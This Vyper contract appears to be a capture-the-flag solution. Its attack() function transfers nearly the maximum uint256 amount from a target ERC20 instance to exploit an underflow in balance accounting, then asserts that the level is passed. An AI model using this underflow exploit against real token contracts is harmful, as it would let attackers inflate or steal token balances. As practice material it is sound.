# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

owner: immutable(address)

instance: address

@external
@payable
def __init__(_instance: address):
    owner = msg.sender
    self.instance = _instance

@external
@view
def instanceBalanceOf(_owner: address) -> uint256:
    return IERC20(self.instance).balanceOf(_owner)

@external
def attack():
    assert msg.sender == owner, "!owner"
    IERC20(self.instance).transfer(msg.sender, max_value(uint256) - 20)
    assert IERC20(self.instance).balanceOf(msg.sender) > 20, "level !passed"
